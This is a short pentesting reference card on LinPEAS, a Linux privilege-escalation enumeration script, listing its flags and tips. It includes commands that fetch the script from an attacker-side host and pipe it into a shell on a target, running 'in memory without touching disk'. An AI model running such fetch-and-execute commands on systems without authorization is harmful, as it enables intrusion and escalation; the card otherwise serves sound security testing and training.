---
slug: linpeas
name: LinPEAS
category: Privesc
tags: [privesc, enumeration, linux, post-exploitation, peass, root]
oneLiner: Linux Privilege Escalation Awesome Script. Run it on a foothold to auto-enumerate the host and flag likely root paths, colour-coded by how promising they are.
---

## Common usage

Serve from attacker, run on target in memory
```sh
curl http://<LHOST>/linpeas.sh | sh
```

Transfer, then run
```sh
wget http://<LHOST>/linpeas.sh && chmod +x linpeas.sh && ./linpeas.sh
```

Save the output for review
```sh
./linpeas.sh -a | tee linpeas.txt
```

## Key parameters

| Flag | What it does |
| --- | --- |
| `(no args)` | Run all default checks |
| `-a` | All checks — thorough but noisier |
| `-s` | Superfast / stealth — skip the slow checks |
| `-e` | Extra / expanded enumeration |
| `-o <groups>` | Run only selected check groups |

## More flags

| Flag | What it does |
| --- | --- |
| `-P <password>` | Provide a sudo password for checks that need it |
| `-t` | Enable time-consuming checks |
| `-h` | Help / list available options |
| `\| tee out.txt` | Keep a copy of the output while it scrolls |

## Gotchas & tips

- Red + yellow highlights mark ~95%-likely privesc vectors — start reading there.
- It's a shell script, so `curl http://<LHOST>/linpeas.sh | sh` runs it entirely in memory without touching disk. Serve it attacker-side with `python3 -m http.server 80`.
- Noisy and thorough — great for labs; in real engagements prefer targeted manual checks.
- The Linux counterpart to the winPEAS page — both come from the PEASS-ng project.
